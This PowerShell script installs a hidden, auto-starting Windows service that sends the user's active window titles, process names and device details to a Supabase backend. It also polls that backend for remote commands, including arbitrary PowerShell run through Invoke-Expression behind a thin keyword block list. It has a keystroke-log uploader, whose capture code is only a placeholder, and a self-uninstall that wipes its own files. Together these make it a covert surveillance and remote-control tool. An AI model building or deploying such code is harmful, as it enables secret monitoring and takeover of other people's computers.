# EnhancedActivityMonitorService.ps1
# Enhanced Windows Service with Remote Management Capabilities

param(
    [string]$Action = "Monitor"
)

# Load configuration
. "$PSScriptRoot\config.ps1"

# Service Configuration
$ServiceName = "ActivityMonitorService"
$LogPath = "$PSScriptRoot\Logs"
$deviceId = "$env:COMPUTERNAME-$env:USERNAME"

# Create logs directory
if (!(Test-Path $LogPath)) {
    New-Item -ItemType Directory -Path $LogPath -Force
}

# Enhanced logging function
function Write-ServiceLog {
    param($Message, $Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    # Write to log file
    Add-Content -Path "$LogPath\service.log" -Value $logMessage
    
    # Keep log file size manageable (last 1000 lines)
    $logLines = Get-Content "$LogPath\service.log" -ErrorAction SilentlyContinue
    if ($logLines.Count -gt 1000) {
        $logLines[-1000..-1] | Set-Content "$LogPath\service.log"
    }
    
    # Also write to console if running interactively
    if ([Environment]::UserInteractive) {
        Write-Host $logMessage
    }
}

# Function to make HTTP requests with retry logic
function Invoke-ApiRequest {
    param(
        [string]$Uri,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [object]$Body = $null,
        [int]$MaxRetries = 3,
        [int]$TimeoutSeconds = 30
    )
    
    $defaultHeaders = @{
        "apikey" = $env:SUPABASE_API_KEY
        "Authorization" = "Bearer $env:SUPABASE_API_KEY"
        "Content-Type" = "application/json"
    }
    
    # Merge headers
    foreach ($key in $defaultHeaders.Keys) {
        if (-not $Headers.ContainsKey($key)) {
            $Headers[$key] = $defaultHeaders[$key]
        }
    }
    
    $attempt = 0
    while ($attempt -lt $MaxRetries) {
        try {
            $params = @{
                Uri = $Uri
                Method = $Method
                Headers = $Headers
                TimeoutSec = $TimeoutSeconds
            }
            
            if ($Body) {
                if ($Body -is [string]) {
                    $params.Body = $Body
                } else {
                    $params.Body = $Body | ConvertTo-Json -Depth 5 -Compress
                }
            }
            
            $response = Invoke-RestMethod @params
            return $response
        }
        catch {
            $attempt++
            Write-ServiceLog "API request failed (attempt $attempt/$MaxRetries): $($_.Exception.Message)" "WARNING"
            
            if ($attempt -ge $MaxRetries) {
                throw $_
            }
            
            Start-Sleep -Seconds (2 * $attempt) # Exponential backoff
        }
    }
}

# Function to check for remote commands
function Check-RemoteCommands {
    try {
        $commands = Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?device_id=eq.$deviceId&status=eq.pending" -Method GET
        
        foreach ($command in $commands) {
            Write-ServiceLog "Processing command: $($command.action) (ID: $($command.id))"
            
            switch ($command.action) {
                "uninstall" {
                    Write-ServiceLog "Executing uninstall command"
                    
                    # Update command status to "executing"
                    $updatePayload = @{
                        status = "executing"
                        result = "Uninstall process started"
                    }
                    
                    try {
                        Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $updatePayload
                        
                        # Execute uninstall
                        $uninstallResult = Invoke-SelfUninstall
                        
                        # Update final status
                        $finalPayload = @{
                            status = if ($uninstallResult) { "completed" } else { "failed" }
                            result = if ($uninstallResult) { "Service uninstalled successfully" } else { "Uninstall failed" }
                            completed_at = (Get-Date).ToString("o")
                        }
                        
                        Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $finalPayload
                        
                        if ($uninstallResult) {
                            Write-ServiceLog "Self-uninstall completed successfully"
                            return $true # Signal to stop service
                        }
                    }
                    catch {
                        Write-ServiceLog "Failed to execute uninstall command: $($_.Exception.Message)" "ERROR"
                        
                        # Update command status to failed
                        $failedPayload = @{
                            status = "failed"
                            result = "Uninstall failed: $($_.Exception.Message)"
                            completed_at = (Get-Date).ToString("o")
                        }
                        
                        try {
                            Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $failedPayload
                        } catch {
                            Write-ServiceLog "Failed to update command status: $($_.Exception.Message)" "ERROR"
                        }
                    }
                }
                
                "restart" {
                    Write-ServiceLog "Executing restart command"
                    
                    try {
                        # Update command status
                        $updatePayload = @{
                            status = "completed"
                            result = "Service restart initiated"
                            completed_at = (Get-Date).ToString("o")
                        }
                        
                        Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $updatePayload
                        
                        # Restart service
                        Restart-Service -Name $ServiceName -Force
                    }
                    catch {
                        Write-ServiceLog "Failed to restart service: $($_.Exception.Message)" "ERROR"
                    }
                }
                
                "update_config" {
                    Write-ServiceLog "Executing config update command"
                    
                    try {
                        if ($command.parameters) {
                            $params = $command.parameters | ConvertFrom-Json
                            
                            # Update environment variables if provided
                            if ($params.SUPABASE_URL) {
                                [Environment]::SetEnvironmentVariable("SUPABASE_URL", $params.SUPABASE_URL, "Machine")
                                $env:SUPABASE_URL = $params.SUPABASE_URL
                            }
                            
                            if ($params.SUPABASE_API_KEY) {
                                [Environment]::SetEnvironmentVariable("SUPABASE_API_KEY", $params.SUPABASE_API_KEY, "Machine")
                                $env:SUPABASE_API_KEY = $params.SUPABASE_API_KEY
                            }
                            
                            # Update command status
                            $updatePayload = @{
                                status = "completed"
                                result = "Configuration updated successfully"
                                completed_at = (Get-Date).ToString("o")
                            }
                            
                            Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $updatePayload
                        }
                    }
                    catch {
                        Write-ServiceLog "Failed to update configuration: $($_.Exception.Message)" "ERROR"
                    }
                }
                
                "get_system_info" {
                    Write-ServiceLog "Executing system info command"
                    
                    try {
                        $systemInfo = Get-SystemInformation
                        
                        # Update command status with system info
                        $updatePayload = @{
                            status = "completed"
                            result = ($systemInfo | ConvertTo-Json -Depth 3 -Compress)
                            completed_at = (Get-Date).ToString("o")
                        }
                        
                        Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $updatePayload
                    }
                    catch {
                        Write-ServiceLog "Failed to get system information: $($_.Exception.Message)" "ERROR"
                    }
                }
                
                "execute_command" {
                    Write-ServiceLog "Executing PowerShell command"
                    
                    try {
                        if ($command.parameters) {
                            $params = $command.parameters | ConvertFrom-Json
                            $commandToExecute = $params.command
                            
                            if ($commandToExecute) {
                                # Execute PowerShell command safely
                                $result = Invoke-SafeCommand -Command $commandToExecute
                                
                                # Update command status with result
                                $updatePayload = @{
                                    status = "completed"
                                    result = $result
                                    completed_at = (Get-Date).ToString("o")
                                }
                                
                                Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/device_commands?id=eq.$($command.id)" -Method PATCH -Body $updatePayload
                            }
                        }
                    }
                    catch {
                        Write-ServiceLog "Failed to execute command: $($_.Exception.Message)" "ERROR"
                    }
                }
                
                default {
                    Write-ServiceLog "Unknown command: $($command.action)" "WARNING"
                }
            }
        }
        
        return $false
    }
    catch {
        Write-ServiceLog "Failed to check remote commands: $($_.Exception.Message)" "WARNING"
        return $false
    }
}

# Function to perform self-uninstall
function Invoke-SelfUninstall {
    try {
        Write-ServiceLog "Starting self-uninstall process"
        
        # Create a temporary script to uninstall the service
        $uninstallScript = @"
# Wait for service to stop
Start-Sleep -Seconds 5

# Remove the service
try {
    `$service = Get-Service -Name "$ServiceName" -ErrorAction SilentlyContinue
    if (`$service) {
        if (`$service.Status -eq "Running") {
            Stop-Service -Name "$ServiceName" -Force
        }
        Remove-Service -Name "$ServiceName"
        Write-Host "Service removed successfully"
    }
    
    # Remove installation directory
    Start-Sleep -Seconds 2
    Remove-Item -Path "$PSScriptRoot" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Installation files removed"
    
    # Remove environment variables
    [Environment]::SetEnvironmentVariable("SUPABASE_URL", `$null, "Machine")
    [Environment]::SetEnvironmentVariable("SUPABASE_API_KEY", `$null, "Machine")
    Write-Host "Environment variables cleaned up"
    
    Write-Host "Uninstall completed successfully"
}
catch {
    Write-Host "Error during uninstall: `$(`$_.Exception.Message)"
}

# Clean up this script
Remove-Item -Path `$MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
"@
        
        $tempScriptPath = "$env:TEMP\ActivityMonitorUninstall_$(Get-Random).ps1"
        $uninstallScript | Out-File -FilePath $tempScriptPath -Encoding UTF8
        
        # Start the uninstall script in a separate process
        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScriptPath`"" -WindowStyle Hidden
        
        Write-ServiceLog "Self-uninstall script started"
        return $true
    }
    catch {
        Write-ServiceLog "Failed to start self-uninstall: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# Enhanced device info update - FIXED VERSION
function Update-DeviceInfo {
    try {
        # Get comprehensive system information
        $computerSystem = Get-CimInstance Win32_ComputerSystem
        $operatingSystem = Get-CimInstance Win32_OperatingSystem
        $processor = Get-CimInstance Win32_Processor | Select-Object -First 1
        $memory = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
        $disk = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -First 1
        
        # Fixed IP address detection
        $ipAddress = "Unknown"
        try {
            # Try multiple methods to get IP address
            $networkConfig = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true -and $_.IPAddress -ne $null }
            if ($networkConfig) {
                $ipAddress = ($networkConfig | Select-Object -First 1).IPAddress[0]
            }
            
            # Fallback method
            if ($ipAddress -eq "Unknown") {
                $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
            }
        }
        catch {
            Write-ServiceLog "Could not determine IP address: $($_.Exception.Message)" "WARNING"
        }
        
        $deviceInfo = @{
            id = $deviceId
            hostname = $env:COMPUTERNAME
            ip_address = $ipAddress
            os = "$($operatingSystem.Caption) $($operatingSystem.Version)"
            processor = $processor.Name
            memory_gb = [math]::Round($memory.Sum / 1GB, 2)
            disk_space_gb = if ($disk) { [math]::Round($disk.Size / 1GB, 2) } else { 0 }
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            last_seen = (Get-Date).ToString("o")
            service_version = "2.0"
        }
        
        # Upsert device information
        $headers = @{ "Prefer" = "resolution=merge-duplicates" }
        Invoke-ApiRequest -Uri "$($env:SUPABASE_URL)/rest/v1/devices" -Method POST -Headers $headers -Body $deviceInfo
        
        Write-ServiceLog "Device info updated successfully"
    }
    catch {
        Write-ServiceLog "Failed to update device info: $($_.Exception.Message)" "WARNING"
    }
}

# Enhanced active window detection - FIXED VERSION
function Get-ActiveWindow {
    try {
        # Fixed Add-Type - avoid duplicate type definitions
        if (-not ([System.Management.Automation.PSTypeName]'WindowInfo').Type) {
            Add-Type -TypeDefinition @"
                using System;
                using System.Runtime.InteropServices;
                using System.Text;
                
                public class WindowInfo {
                    [DllImport("user32.dll")]
                    public static extern IntPtr GetForegroundWindow();
                    
                    [DllImport("user32.dll")]
                    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
                    
                    [DllImport("user32.dll")]
                    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
                    
                    [DllImport("user32.dll")]
                    public static extern bool IsWindowVisible(IntPtr hWnd);
                    
                    [DllImport("user32.dll")]
                    public static extern bool GetWindowRect(IntPtr hwnd, ref Rectangle rectangle);
                    
                    [StructLayout(LayoutKind.Sequential)]
                    public struct Rectangle {
                        public int Left, Top, Right, Bottom;
                    }
                }
"@ -ErrorAction SilentlyContinue
        }
        
        $hwnd = [WindowInfo]::GetForegroundWindow()
        if ($hwnd -eq [IntPtr]::Zero) { return $null }
        
        # Check if window is visible
        if (-not [WindowInfo]::IsWindowVisible($hwnd)) { return $null }
        
        $title = New-Object System.Text.StringBuilder 256
        [WindowInfo]::GetWindowText($hwnd, $title, 256) | Out-Null
        
        $processId = 0
        [WindowInfo]::GetWindowThreadProcessId($hwnd, [ref]$processId) | Out-Null
        
        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
        
        if ($process -and $title.ToString().Trim() -ne "") {
            # Get window dimensions
            $rect = New-Object WindowInfo+Rectangle
            [WindowInfo]::GetWindowRect($hwnd, [ref]$rect) | Out-Null
            
            return @{
                ProcessName = $process.ProcessName
                WindowTitle = $title.ToString()
                ProcessId = $processId
                WindowHandle = $hwnd.ToInt64()
                Width = $rect.Right - $rect.Left
                Height = $rect.Bottom - $rect.Top
                Left = $rect.Left
                Top = $rect.Top
            }
        }
    }
    catch {
        Write-ServiceLog "Error getting active window: $($_.Exception.Message)" "ERROR"
    }
    return $null
}

# Function to get comprehensive system information
function Get-SystemInformation {
    try {
        $computerSystem = Get-CimInstance Win32_ComputerSystem
        $operatingSystem = Get-CimInstance Win32_OperatingSystem
        $processor = Get-CimInstance Win32_Processor | Select-Object -First 1
        $memory = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
        $disks = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
        
        $systemInfo = @{
            Computer = @{
                Hostname = $env:COMPUTERNAME
                Domain = $env:USERDOMAIN
                Username = $env:USERNAME
                Manufacturer = $computerSystem.Manufacturer
                Model = $computerSystem.Model
                TotalPhysicalMemory = [math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
            }
            OperatingSystem = @{
                Name = $operatingSystem.Caption
                Version = $operatingSystem.Version
                BuildNumber = $operatingSystem.BuildNumber
                Architecture = $operatingSystem.OSArchitecture
                InstallDate = $operatingSystem.InstallDate
                LastBootUpTime = $operatingSystem.LastBootUpTime
            }
            Processor = @{
                Name = $processor.Name
                Cores = $processor.NumberOfCores
                LogicalProcessors = $processor.NumberOfLogicalProcessors
                MaxClockSpeed = $processor.MaxClockSpeed
            }
            Memory = @{
                TotalCapacity = [math]::Round($memory.Sum / 1GB, 2)
                AvailableMemory = [math]::Round($operatingSystem.FreePhysicalMemory / 1MB, 2)
            }
            Disks = @($disks | ForEach-Object {
                @{
                    Drive = $_.DeviceID
                    Label = $_.VolumeName
                    Size = [math]::Round($_.Size / 1GB, 2)
                    FreeSpace = [math]::Round($_.FreeSpace / 1GB, 2)
                    PercentFree = [math]::Round(($_.FreeSpace / $_.Size) * 100, 1)
                }
            })
            Network = @($networkAdapters | ForEach-Object {
                @{
                    Description = $_.Description
                    IPAddress = $_.IPAddress -join ", "
                    MACAddress = $_.MACAddress
                    DHCPEnabled = $_.DHCPEnabled
                }
            })
            Timestamp = (Get-Date).ToString("o")
        }
        
        return $systemInfo
    }
    catch {
        Write-ServiceLog "Failed to get system information: $($_.Exception.Message)" "ERROR"
        return @{ Error = $_.Exception.Message }
    }
}

# Function to safely execute PowerShell commands
function Invoke-SafeCommand {
    param([string]$Command)
    
    try {
        # List of dangerous commands to block
        $dangerousCommands = @(
            "Remove-Item", "rm", "del", "rmdir",
            "Format-Volume", "Stop-Service", "Stop-Process",
            "Restart-Computer", "Stop-Computer",
            "Set-ExecutionPolicy", "Invoke-Expression", "iex"
        )
        
        # Check if command contains dangerous operations
        foreach ($dangerous in $dangerousCommands) {
            if ($Command -match $dangerous) {
                return "Command blocked for security reasons: $dangerous"
            }
        }
        
        # Execute command with timeout
        $job = Start-Job -ScriptBlock {
            param($cmd)
            try {
                Invoke-Expression $cmd
            }
            catch {
                "Error: $($_.Exception.Message)"
            }
        } -ArgumentList $Command
        
        # Wait for job to complete with timeout
        $timeout = Wait-Job -Job $job -Timeout 30
        
        if ($timeout) {
            $result = Receive-Job -Job $job
            Remove-Job -Job $job
            return ($result | Out-String).Trim()
        }
        else {
            Stop-Job -Job $job
            Remove-Job -Job $job
            return "Command timed out after 30 seconds"
        }
    }
    catch {
        return "Error executing command: $($_.Exception.Message)"
    }
}

# Enhanced keystroke logging with buffer management
function Start-KeystrokMonitoring {
    Write-ServiceLog "Starting keystroke monitoring"
    
    # Initialize keystroke buffer
    $keystrokeBuffer = @()
    $bufferLimit = 100
    $lastFlush = Get-Date
    
    # Note: This is a placeholder for actual keystroke capture
    # Real implementation would require low-level Windows API hooks
    # which are not easily implementable in pure PowerShell
    
    while ($true) {
        try {
            # Simulate keystroke capture (replace with actual implementation)
            # $keystrokes = Capture-Keystrokes
            
            # Flush buffer every 60 seconds or when it reaches limit
            if (((Get-Date) - $lastFlush).TotalSeconds -gt 60 -or $keystrokeBuffer.Count -gt $bufferLimit) {
                if ($keystrokeBuffer.Count -gt 0) {
                    $keystrokeLog = @{
                        device_id = $deviceId
                        keystrokes = $keystrokeBuffer -join ""
                        timestamp = (Get-Date).ToString("o")
                        window_title = (Get-ActiveWindow).WindowTitle
                    }
                    
                    $sent = Send-Log -table "key_logs" -payload $keystrokeLog
                    if ($sent) {
                        $keystrokeBuffer = @()
                        $lastFlush = Get-Date
                    }
                }
            }
            
            Start-Sleep -Milliseconds 100
        }
        catch {
            Write-ServiceLog "Error in keystroke monitoring: $($_.Exception.Message)" "ERROR"
            Start-Sleep -Seconds 5
        }
    }
}

# Function to send logs to Supabase
function Send-Log {
    param ($table, $payload)
    try {
        $headers = @{ 
            "apikey" = $env:SUPABASE_API_KEY
            "Authorization" = "Bearer $env:SUPABASE_API_KEY"
            "Content-Type" = "application/json" 
        }
        $json = $payload | ConvertTo-Json -Depth 5 -Compress
        $response = Invoke-RestMethod -Uri "$($env:SUPABASE_URL)/rest/v1/$table" -Method POST -Headers $headers -Body $json -TimeoutSec 10
        Write-ServiceLog "Successfully sent data to $table"
        return $true
    }
    catch {
        $errorMessage = $_.Exception.Message
        Write-ServiceLog "Failed to send data to ${table}: $errorMessage" "ERROR"
        return $false
    }
}

# Main monitoring function
function Start-Monitoring {
    Write-ServiceLog "Starting enhanced activity monitoring service"
    
    $lastWindow = $null
    $lastUpdateTime = Get-Date
    $lastCommandCheck = Get-Date
    
    # Update device info initially
    Update-DeviceInfo
    
    # Start keystroke monitoring in background job
    $keystrokeJob = Start-Job -ScriptBlock {
        param($scriptPath, $deviceId)
        . $scriptPath
        Start-KeystrokMonitoring
    } -ArgumentList $MyInvocation.MyCommand.Path, $deviceId
    
    while ($true) {
        try {
            # Check for remote commands every 30 seconds
            if ((Get-Date) - $lastCommandCheck -gt [TimeSpan]::FromSeconds(30)) {
                $shouldStop = Check-RemoteCommands
                if ($shouldStop) {
                    Write-ServiceLog "Stopping service due to remote command"
                    break
                }
                $lastCommandCheck = Get-Date
            }
            
            # Update device info every 5 minutes
            if ((Get-Date) - $lastUpdateTime -gt [TimeSpan]::FromMinutes(5)) {
                Update-DeviceInfo
                $lastUpdateTime = Get-Date
            }
            
            # Get current active window
            $currentWindow = Get-ActiveWindow
            
            if ($currentWindow -and ($lastWindow -eq $null -or 
                $currentWindow.ProcessName -ne $lastWindow.ProcessName -or 
                $currentWindow.WindowTitle -ne $lastWindow.WindowTitle)) {
                
                # Log activity change
                $activityLog = @{
                    device_id = $deviceId
                    process_name = $currentWindow.ProcessName
                    window_title = $currentWindow.WindowTitle
                    window_handle = $currentWindow.WindowHandle
                    window_width = $currentWindow.Width
                    window_height = $currentWindow.Height
                    timestamp = (Get-Date).ToString("o")
                }
                
                $sent = Send-Log -table "activity_logs" -payload $activityLog
                if ($sent) {
                    $lastWindow = $currentWindow
                }
            }
            
            Start-Sleep -Seconds 5
        }
        catch {
            Write-ServiceLog "Error in monitoring loop: $($_.Exception.Message)" "ERROR"
            Start-Sleep -Seconds 10
        }
    }
    
    # Clean up background job
    if ($keystrokeJob) {
        Stop-Job -Job $keystrokeJob -ErrorAction SilentlyContinue
        Remove-Job -Job $keystrokeJob -ErrorAction SilentlyContinue
    }
    
    Write-ServiceLog "Monitoring service stopped"
}

# Service installation functions
function Install-Service {
    Write-ServiceLog "Installing enhanced service..."
    
    # Create service executable script
    $serviceScript = @"
# Enhanced Service Runner Script
`$ServicePath = Split-Path -Parent `$MyInvocation.MyCommand.Path
Set-Location `$ServicePath

# Load configuration
. "`$ServicePath\config.ps1"

# Import the main service module
. "`$ServicePath\EnhancedActivityMonitorService.ps1"

# Start monitoring
Start-Monitoring
"@
    
    $serviceScriptPath = "$PSScriptRoot\ServiceRunner.ps1"
    $serviceScript | Out-File -FilePath $serviceScriptPath -Encoding UTF8
    
    # Create the service
    $params = @{
        Name = $ServiceName
        BinaryPathName = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$serviceScriptPath`""
        DisplayName = "Enhanced Activity Monitor Service"
        Description = "Enhanced activity and keystroke monitoring service with remote management capabilities"
        StartupType = "Automatic"
    }
    
    try {
        # Remove existing service if present
        $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
        if ($existingService) {
            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
            Remove-Service -Name $ServiceName
            Start-Sleep -Seconds 2
        }
        
        New-Service @params
        Write-ServiceLog "Service installed successfully"
        Start-Service -Name $ServiceName
        Write-ServiceLog "Service started successfully"
        return $true
    }
    catch {
        Write-ServiceLog "Failed to install service: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# Main execution based on action parameter
switch ($Action.ToLower()) {
    "install" {
        Install-Service
    }
    
    "monitor" {
        # For testing - run monitoring directly
        Start-Monitoring
    }
    
    default {
        Write-Host "Usage: EnhancedActivityMonitorService.ps1 -Action [Install|Monitor]"
    }
}